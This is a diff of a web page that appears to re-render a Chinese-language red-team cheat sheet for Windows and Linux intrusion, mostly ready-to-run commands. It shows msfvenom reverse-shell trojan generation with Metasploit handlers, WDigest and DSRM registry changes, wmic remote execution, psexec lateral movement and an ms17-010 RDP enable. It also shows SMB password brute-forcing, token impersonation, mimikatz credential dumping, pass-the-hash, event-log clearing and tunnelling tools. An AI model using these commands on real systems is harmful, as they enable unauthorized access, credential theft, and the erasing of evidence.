+</span></span><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v &#34;DontSendAdditionalData&#34; /t REG_DWORD /d 1 /f
+</span></span></code></pre></div><pre><code>- 开启所有程序异常弹窗
 </code></pre>
-<pre tabindex="0"><code>reg delete &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v DontShowUI /f
-reg delete &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v Disabled /f
-reg delete &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v LoggingDisabled /f
-reg delete &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v DontSendAdditionalData /f
-</code></pre><blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg delete &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v DontShowUI /f
+</span></span><span class="line"><span class="cl">reg delete &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v Disabled /f
+</span></span><span class="line"><span class="cl">reg delete &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v LoggingDisabled /f
+</span></span><span class="line"><span class="cl">reg delete &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v DontSendAdditionalData /f
+</span></span></code></pre></div><blockquote>
 <p><strong>注意</strong>：win7下的弹窗错误程序为WerFault.exe，使用计划任务不会出现弹窗错误</p>
 </blockquote>
 <ol start="11">
 <li>wmic命令执行</li>
 </ol>
-<pre tabindex="0"><code>net use \\192.168.7.7\ipc$ &#34;1qaz@WSX&#34; /user:administrator #建立ipc链接
-wmic /node:192.168.7.7 process call create &#34;cmd.exe /c ipconfig &gt;c:\ip.txt&#34; #执行cmd命令并将结果保存在txt文档中
-type \\192.168.7.7\C$\ip.txt  #查看执行结果
-或
-wmic /node:192.168.7.7 /user:administrator /password:1qaz@WSX1qaz@WSX process call create &#34;cmd /c ipconfig &gt; c:\1.txt&#34;
-</code></pre><ol start="12">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net use \\192.168.7.7\ipc$ &#34;1qaz@WSX&#34; /user:administrator #建立ipc链接
+</span></span><span class="line"><span class="cl">wmic /node:192.168.7.7 process call create &#34;cmd.exe /c ipconfig &gt;c:\ip.txt&#34; #执行cmd命令并将结果保存在txt文档中
+</span></span><span class="line"><span class="cl">type \\192.168.7.7\C$\ip.txt  #查看执行结果
+</span></span><span class="line"><span class="cl">或
+</span></span><span class="line"><span class="cl">wmic /node:192.168.7.7 /user:administrator /password:1qaz@WSX1qaz@WSX process call create &#34;cmd /c ipconfig &gt; c:\1.txt&#34;
+</span></span></code></pre></div><ol start="12">
 <li>启用dsrm登录</li>
 </ol>
-<pre tabindex="0"><code>New-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34; -name &#34;DsrmAdminLogonBehavior&#34; -value 2 -propertyType DWORD #powershell
-或
-reg add &#34;HKLM\System\CurrentControlSet\Control\Lsa&#34; /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
-</code></pre><ol start="13">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">New-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34; -name &#34;DsrmAdminLogonBehavior&#34; -value 2 -propertyType DWORD #powershell
+</span></span><span class="line"><span class="cl">或
+</span></span><span class="line"><span class="cl">reg add &#34;HKLM\System\CurrentControlSet\Control\Lsa&#34; /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
+</span></span></code></pre></div><ol start="13">
 <li>修改注册表抓明文(win10或2012R2以上，未验证）</li>
 </ol>
-<pre tabindex="0"><code>reg add HKLM/SYSTEM/CurrentControlSet/Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg add HKLM/SYSTEM/CurrentControlSet/Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+</span></span></code></pre></div><ul>
 <li>
 <h3 id="其他命令">其他命令<a hidden class="anchor" aria-hidden="true" href="#其他命令">#</a></h3>
 </li>
 </ul>
-<pre tabindex="0"><code>netsh winsock reset #重启网络
-</code></pre><h3 id="横向移动">横向移动<a hidden class="anchor" aria-hidden="true" href="#横向移动">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netsh winsock reset #重启网络
+</span></span></code></pre></div><h3 id="横向移动">横向移动<a hidden class="anchor" aria-hidden="true" href="#横向移动">#</a></h3>
 <ol>
 <li>ping扫描</li>
 </ol>
-<pre tabindex="0"><code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &#34;TTL=&#34;   用Ping命令探测内网主机
-</code></pre><h2 id="msf">MSF<a hidden class="anchor" aria-hidden="true" href="#msf">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &#34;TTL=&#34;   用Ping命令探测内网主机
+</span></span></code></pre></div><h2 id="msf">MSF<a hidden class="anchor" aria-hidden="true" href="#msf">#</a></h2>
 <h3 id="msf生成windows木马命令">MSF生成Windows木马命令<a hidden class="anchor" aria-hidden="true" href="#msf生成windows木马命令">#</a></h3>
 <ol>
 <li>反向链接木马<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.131 lport=6000 -f exe &gt;shell.exe</code></li>
 <li>反向链接木马操作</li>
 </ol>
-<pre tabindex="0"><code>msfconsole
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set lhost 127.0.0.1   #设置监听ip，必须和frpc中的local_ip 一致
-set lport 2222        #设置监听端口，与frpc中的local_port一致
-exploit
-</code></pre><h3 id="msf生成linux木马命令">MSF生成Linux木马命令<a hidden class="anchor" aria-hidden="true" href="#msf生成linux木马命令">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">msfconsole</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lhost</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>   <span class="c1">#设置监听ip，必须和frpc中的local_ip 一致</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">2222</span>        <span class="c1">#设置监听端口，与frpc中的local_port一致</span>
+</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
+</span></span></code></pre></div><h3 id="msf生成linux木马命令">MSF生成Linux木马命令<a hidden class="anchor" aria-hidden="true" href="#msf生成linux木马命令">#</a></h3>
 <ol>
 <li>反向链接木马</li>
 </ol>
-<pre tabindex="0"><code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=4444 -f elf &gt; shell.elf
-</code></pre><ol start="2">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=4444 -f elf &gt; shell.elf
+</span></span></code></pre></div><ol start="2">
 <li>反向链接木马操作</li>
 </ol>
-<pre tabindex="0"><code>msfconsole
-use exploit/multi/handler
-set payload linux/x64/meterpreter/reverse_tcp
-set lhost 127.0.0.1   #设置监听ip，必须和frpc中的local_ip 一致
-set lport 2222        #设置监听端口，与frpc中的local_port一致
-exploit
-</code></pre><h3 id="msf生成linux系统的java网站木马命令">MSF生成Linux系统的Java网站木马命令<a hidden class="anchor" aria-hidden="true" href="#msf生成linux系统的java网站木马命令">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">msfconsole</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">linux</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lhost</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>   <span class="c1">#设置监听ip，必须和frpc中的local_ip 一致</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">2222</span>        <span class="c1">#设置监听端口，与frpc中的local_port一致</span>
+</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
+</span></span></code></pre></div><h3 id="msf生成linux系统的java网站木马命令">MSF生成Linux系统的Java网站木马命令<a hidden class="anchor" aria-hidden="true" href="#msf生成linux系统的java网站木马命令">#</a></h3>
 <ol>
 <li>木马<code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=2222 -f jsp &gt; shell.jsp</code></li>
 <li>链接操作</li>
 </ol>
-<pre tabindex="0"><code>msfconsole
-use exploit/multi/handler
-set payload linux/x64/meterpreter/reverse_tcp
-set lhost 127.0.0.1   #设置监听ip，必须和frpc中的local_ip 一致
-set lport 2222        #设置监听端口，与frpc中的local_port一致
-exploit
-</code></pre><h3 id="msf常见命令">MSF常见命令<a hidden class="anchor" aria-hidden="true" href="#msf常见命令">#</a></h3>
-<pre tabindex="0"><code>getuid   #获取当前账号权限
-getsystem #获取system权限
-run post/windows/manage/enable_rdp #关闭windows防火墙
-run post/windows/gather/smart_hashdump 获取window哈希
-run autoroute -s 192.168.52.0/24 #添加路由，在木马上使用
-autoroute -p #查看路由，在密码上使用
-route add 192.168.138.0 255.255.255.0 1 #添加路由在msf上使用
-route print    #查看路由在msf上使用
-run post/windows/gather/enum_patches #查看补丁情况
-setg Proxies socks5:127.0.0.1:1080 #设置代理
-show options lhost #显示lhost的设置
-</code></pre><h3 id="psexec传递-确保已经设置好路由">psexec传递 （确保已经设置好路由）<a hidden class="anchor" aria-hidden="true" href="#psexec传递-确保已经设置好路由">#</a></h3>
-<pre tabindex="0"><code>use exploit/windows/smb/psexec
-set payload windows/x64/meterpreter/bind_tcp
-set rhost 10.10.10.10
-set SMBUser administrator
-set SMBPass 1qaz@WSX
-run
-</code></pre><h3 id="msf使用ms17-010开启3389">MSF使用ms17-010开启3389<a hidden class="anchor" aria-hidden="true" href="#msf使用ms17-010开启3389">#</a></h3>
-<pre tabindex="0"><code>use auxiliary/admin/smb/ms17_010_command
-set COMMAND REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&#34; \&#34;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f 
-set rhost x.x.x.x
-</code></pre><h3 id="msf使用mimikatz被kiwi取代">MSF使用mimikatz（被kiwi取代）<a hidden class="anchor" aria-hidden="true" href="#msf使用mimikatz被kiwi取代">#</a></h3>
-<pre tabindex="0"><code>migrate [PID]   #如果是x64需要这个步骤
-load kiwi #加载模块
-help kiwi #查看帮助
-
-creds_all：列举所有凭据
-creds_kerberos：列举所有kerberos凭据
-creds_msv：列举所有msv凭据
-creds_ssp：列举所有ssp凭据
-creds_tspkg：列举所有tspkg凭据
-creds_wdigest：列举所有wdigest凭据
-dcsync：通过DCSync检索用户帐户信息
-dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
-golden_ticket_create：创建黄金票据
-kerberos_ticket_list：列举kerberos票据
-kerberos_ticket_purge：清除kerberos票据
-kerberos_ticket_use：使用kerberos票据
-kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
-lsa_dump_sam：dump出lsa的SAM
-lsa_dump_secrets：dump出lsa的密文
-password_change：修改密码
-wifi_list：列出当前用户的wifi配置文件
-wifi_list_shared：列出共享wifi配置文件/编码
-</code></pre><h3 id="msf-smb爆破密码">MSF smb爆破密码<a hidden class="anchor" aria-hidden="true" href="#msf-smb爆破密码">#</a></h3>
-<pre tabindex="0"><code>use auxiliary/scanner/smb/smb_login
-set SMBUser administrator
-set PASS_FILE /root/fuzzDicts/passwordDict/top500.txt
-set rhost 192.168.93.10
-exploit
-</code></pre><h3 id="msf-令牌偷取用于提权">MSF 令牌偷取（用于提权）<a hidden class="anchor" aria-hidden="true" href="#msf-令牌偷取用于提权">#</a></h3>
-<pre tabindex="0"><code>getuid    #查看当前token
-use incognito #加载incognito
-list_tokens -u #列出AccessToken
-impersonate_token &#34;TEST\adminitrator&#34; #模拟TEST\adminitrator用户
-rev2self   #返回到之前的AccessToken权限
-</code></pre><h3 id="msf存活主机探测">MSF存活主机探测<a hidden class="anchor" aria-hidden="true" href="#msf存活主机探测">#</a></h3>
-<pre tabindex="0"><code>use auxiliary/scanner/discovery/udp_probe
-set rhosts 192.168.183.0/24
-set threads 5
-exploit
-</code></pre><h3 id="msf-powershell-攻击">MSF powershell 攻击<a hidden class="anchor" aria-hidden="true" href="#msf-powershell-攻击">#</a></h3>
-<pre tabindex="0"><code>use exploit/multi/script/web_delivery
-set target 2    # 选择使用powershell类型的payload
-set payload windows/meterpreter/reverse_tcp
-set lport 2222
-set lhost 192.168.135.150
-exploit
-</code></pre><h3 id="msf清除痕迹">MSF清除痕迹<a hidden class="anchor" aria-hidden="true" href="#msf清除痕迹">#</a></h3>
-<pre tabindex="0"><code>run event_manager -i
-run event_manager -c
-</code></pre><h2 id="小工具使用">小工具使用<a hidden class="anchor" aria-hidden="true" href="#小工具使用">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">msfconsole</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">linux</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lhost</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>   <span class="c1">#设置监听ip，必须和frpc中的local_ip 一致</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">2222</span>        <span class="c1">#设置监听端口，与frpc中的local_port一致</span>
+</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
+</span></span></code></pre></div><h3 id="msf常见命令">MSF常见命令<a hidden class="anchor" aria-hidden="true" href="#msf常见命令">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">getuid</span>   <span class="c1">#获取当前账号权限</span>
+</span></span><span class="line"><span class="cl"><span class="n">getsystem</span> <span class="c1">#获取system权限</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">enable_rdp</span> <span class="c1">#关闭windows防火墙</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">smart_hashdump</span> <span class="err">获取</span><span class="n">window哈希</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span> <span class="n">autoroute</span> <span class="o">-</span><span class="n">s</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">52.0</span><span class="o">/</span><span class="mi">24</span> <span class="c1">#添加路由，在木马上使用</span>
+</span></span><span class="line"><span class="cl"><span class="n">autoroute</span> <span class="o">-</span><span class="n">p</span> <span class="c1">#查看路由，在密码上使用</span>
+</span></span><span class="line"><span class="cl"><span class="n">route</span> <span class="n">add</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">138.0</span> <span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span> <span class="mi">1</span> <span class="c1">#添加路由在msf上使用</span>
+</span></span><span class="line"><span class="cl"><span class="n">route</span> <span class="nb">print</span>    <span class="c1">#查看路由在msf上使用</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_patches</span> <span class="c1">#查看补丁情况</span>
+</span></span><span class="line"><span class="cl"><span class="n">setg</span> <span class="n">Proxies</span> <span class="n">socks5</span><span class="p">:</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">1080</span> <span class="c1">#设置代理</span>
+</span></span><span class="line"><span class="cl"><span class="n">show</span> <span class="n">options</span> <span class="n">lhost</span> <span class="c1">#显示lhost的设置</span>
+</span></span></code></pre></div><h3 id="psexec传递-确保已经设置好路由">psexec传递 （确保已经设置好路由）<a hidden class="anchor" aria-hidden="true" href="#psexec传递-确保已经设置好路由">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">psexec</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">rhost</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">SMBUser</span> <span class="n">administrator</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">SMBPass</span> <span class="mi">1</span><span class="n">qaz</span><span class="err">@</span><span class="n">WSX</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span>
+</span></span></code></pre></div><h3 id="msf使用ms17-010开启3389">MSF使用ms17-010开启3389<a hidden class="anchor" aria-hidden="true" href="#msf使用ms17-010开启3389">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/admin/smb/ms17_010_command
+</span></span><span class="line"><span class="cl">set COMMAND REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&#34; \&#34;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+</span></span><span class="line"><span class="cl">set rhost x.x.x.x
+</span></span></code></pre></div><h3 id="msf使用mimikatz被kiwi取代">MSF使用mimikatz（被kiwi取代）<a hidden class="anchor" aria-hidden="true" href="#msf使用mimikatz被kiwi取代">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">migrate</span> <span class="p">[</span><span class="n">PID</span><span class="p">]</span>   <span class="c1">#如果是x64需要这个步骤</span>
+</span></span><span class="line"><span class="cl"><span class="nb">load</span> <span class="n">kiwi</span> <span class="c1">#加载模块</span>
+</span></span><span class="line"><span class="cl"><span class="n">help</span> <span class="n">kiwi</span> <span class="c1">#查看帮助</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">creds_all</span><span class="err">：列举所有凭据</span>
+</span></span><span class="line"><span class="cl"><span class="n">creds_kerberos</span><span class="err">：列举所有</span><span class="n">kerberos凭据</span>
+</span></span><span class="line"><span class="cl"><span class="n">creds_msv</span><span class="err">：列举所有</span><span class="n">msv凭据</span>
+</span></span><span class="line"><span class="cl"><span class="n">creds_ssp</span><span class="err">：列举所有</span><span class="n">ssp凭据</span>
+</span></span><span class="line"><span class="cl"><span class="n">creds_tspkg</span><span class="err">：列举所有</span><span class="n">tspkg凭据</span>
+</span></span><span class="line"><span class="cl"><span class="n">creds_wdigest</span><span class="err">：列举所有</span><span class="n">wdigest凭据</span>
+</span></span><span class="line"><span class="cl"><span class="n">dcsync</span><span class="err">：通过</span><span class="n">DCSync检索用户帐户信息</span>
+</span></span><span class="line"><span class="cl"><span class="n">dcsync_ntlm</span><span class="err">：通过</span><span class="n">DCSync检索用户帐户NTLM散列</span><span class="err">、</span><span class="n">SID和RID</span>
+</span></span><span class="line"><span class="cl"><span class="n">golden_ticket_create</span><span class="err">：创建黄金票据</span>
+</span></span><span class="line"><span class="cl"><span class="n">kerberos_ticket_list</span><span class="err">：列举</span><span class="n">kerberos票据</span>
+</span></span><span class="line"><span class="cl"><span class="n">kerberos_ticket_purge</span><span class="err">：清除</span><span class="n">kerberos票据</span>
+</span></span><span class="line"><span class="cl"><span class="n">kerberos_ticket_use</span><span class="err">：使用</span><span class="n">kerberos票据</span>
+</span></span><span class="line"><span class="cl"><span class="n">kiwi_cmd</span><span class="err">：执行</span><span class="n">mimikatz的命令</span><span class="err">，后面接</span><span class="n">mimikatz</span><span class="o">.</span><span class="n">exe的命令</span>
+</span></span><span class="line"><span class="cl"><span class="n">lsa_dump_sam</span><span class="err">：</span><span class="n">dump出lsa的SAM</span>
+</span></span><span class="line"><span class="cl"><span class="n">lsa_dump_secrets</span><span class="err">：</span><span class="n">dump出lsa的密文</span>
+</span></span><span class="line"><span class="cl"><span class="n">password_change</span><span class="err">：修改密码</span>
+</span></span><span class="line"><span class="cl"><span class="n">wifi_list</span><span class="err">：列出当前用户的</span><span class="n">wifi配置文件</span>
+</span></span><span class="line"><span class="cl"><span class="n">wifi_list_shared</span><span class="err">：列出共享</span><span class="n">wifi配置文件</span><span class="o">/</span><span class="err">编码</span>
+</span></span></code></pre></div><h3 id="msf-smb爆破密码">MSF smb爆破密码<a hidden class="anchor" aria-hidden="true" href="#msf-smb爆破密码">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/smb/smb_login
+</span></span><span class="line"><span class="cl">set SMBUser administrator
+</span></span><span class="line"><span class="cl">set PASS_FILE /root/fuzzDicts/passwordDict/top500.txt
+</span></span><span class="line"><span class="cl">set rhost 192.168.93.10
+</span></span><span class="line"><span class="cl">exploit
+</span></span></code></pre></div><h3 id="msf-令牌偷取用于提权">MSF 令牌偷取（用于提权）<a hidden class="anchor" aria-hidden="true" href="#msf-令牌偷取用于提权">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getuid    #查看当前token
+</span></span><span class="line"><span class="cl">use incognito #加载incognito
+</span></span><span class="line"><span class="cl">list_tokens -u #列出AccessToken
+</span></span><span class="line"><span class="cl">impersonate_token &#34;TEST\adminitrator&#34; #模拟TEST\adminitrator用户
+</span></span><span class="line"><span class="cl">rev2self   #返回到之前的AccessToken权限
+</span></span></code></pre></div><h3 id="msf存活主机探测">MSF存活主机探测<a hidden class="anchor" aria-hidden="true" href="#msf存活主机探测">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/discovery/udp_probe
+</span></span><span class="line"><span class="cl">set rhosts 192.168.183.0/24
+</span></span><span class="line"><span class="cl">set threads 5
+</span></span><span class="line"><span class="cl">exploit
+</span></span></code></pre></div><h3 id="msf-powershell-攻击">MSF powershell 攻击<a hidden class="anchor" aria-hidden="true" href="#msf-powershell-攻击">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">script</span><span class="o">/</span><span class="n">web_delivery</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">target</span> <span class="mi">2</span>    <span class="c1"># 选择使用powershell类型的payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">2222</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lhost</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">135.150</span>
+</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
+</span></span></code></pre></div><h3 id="msf清除痕迹">MSF清除痕迹<a hidden class="anchor" aria-hidden="true" href="#msf清除痕迹">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run event_manager -i
+</span></span><span class="line"><span class="cl">run event_manager -c
+</span></span></code></pre></div><h2 id="小工具使用">小工具使用<a hidden class="anchor" aria-hidden="true" href="#小工具使用">#</a></h2>
 <h3 id="mimitakz使用">Mimitakz使用<a hidden class="anchor" aria-hidden="true" href="#mimitakz使用">#</a></h3>
 <ol>
 <li>获取账号密码</li>
 </ol>
-<pre tabindex="0"><code>privilege::debug #权限提升
-sekurlsa::logonPasswords #获取账号密码
-</code></pre><ol start="2">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug #权限提升
+</span></span><span class="line"><span class="cl">sekurlsa::logonPasswords #获取账号密码
+</span></span></code></pre></div><ol start="2">
 <li>获取NTLM hash</li>
 </ol>
-<pre tabindex="0"><code>privilege::debug
-token::elevate
-lsadump::sam
-</code></pre><ol start="3">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">token::elevate
+</span></span><span class="line"><span class="cl">lsadump::sam
+</span></span></code></pre></div><ol start="3">
 <li>hash攻击 （会弹出一个cmd窗口，有风险）</li>
 </ol>
-<pre tabindex="0"><code>privilege::debug
-sekurlsa::pth /domain:DC /user:Administrator /ntlm:e8bea972b3549868cecd667a64a6ac46
-#DC是域控的名称 ntlm是上述获得结果
-</code></pre><h3 id="eeathworm使用">Eeathworm使用<a hidden class="anchor" aria-hidden="true" href="#eeathworm使用">#</a></h3>
-<pre tabindex="0"><code>-l listenport  open a port for the service startup.      // 为服务启动打开一个端口。
--d refhost set the reflection host address.                // 设置反连主机地址。
--e refport set the reflection port.                              // 设置反连端口。
--f connhost set the connect host address .               // 设置连接主机地址。
--g connport set the connect port.                             // 设置连接端口。
--t usectime set the milliseconds for timeout. The default value is 1000 // 设置超时的毫秒数。默认值值为1000
--s state setup the function.                       // 状态设置功能。共有六种ssocksd rcsocks rssocks lcx_slave lcx_tran lcx_listen
-
-ssocksd rcsocks rssocks 为socket5 正向代理，反向代理，正反向代理
-lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。
-lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。
-lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。
-</code></pre><h3 id="proxychains4-使用方法">proxychains4 使用方法<a hidden class="anchor" aria-hidden="true" href="#proxychains4-使用方法">#</a></h3>
-<pre tabindex="0"><code>proxychains4 nmap -p 3389 -Pn -sT 192.168.52.141   # 需要配置/etc/proxychains4.conf文件   -Pn和-sT必须要有， 192.168.52.141是要扫描的内网地址
-</code></pre><h3 id="chisel使用">chisel使用<a hidden class="anchor" aria-hidden="true" href="#chisel使用">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">sekurlsa::pth /domain:DC /user:Administrator /ntlm:e8bea972b3549868cecd667a64a6ac46
+</span></span><span class="line"><span class="cl">#DC是域控的名称 ntlm是上述获得结果
+</span></span></code></pre></div><h3 id="eeathworm使用">Eeathworm使用<a hidden class="anchor" aria-hidden="true" href="#eeathworm使用">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-l listenport  open a port for the service startup.      // 为服务启动打开一个端口。
+</span></span><span class="line"><span class="cl">-d refhost set the reflection host address.                // 设置反连主机地址。
+</span></span><span class="line"><span class="cl">-e refport set the reflection port.                              // 设置反连端口。
+</span></span><span class="line"><span class="cl">-f connhost set the connect host address .               // 设置连接主机地址。
+</span></span><span class="line"><span class="cl">-g connport set the connect port.                             // 设置连接端口。
+</span></span><span class="line"><span class="cl">-t usectime set the milliseconds for timeout. The default value is 1000 // 设置超时的毫秒数。默认值值为1000
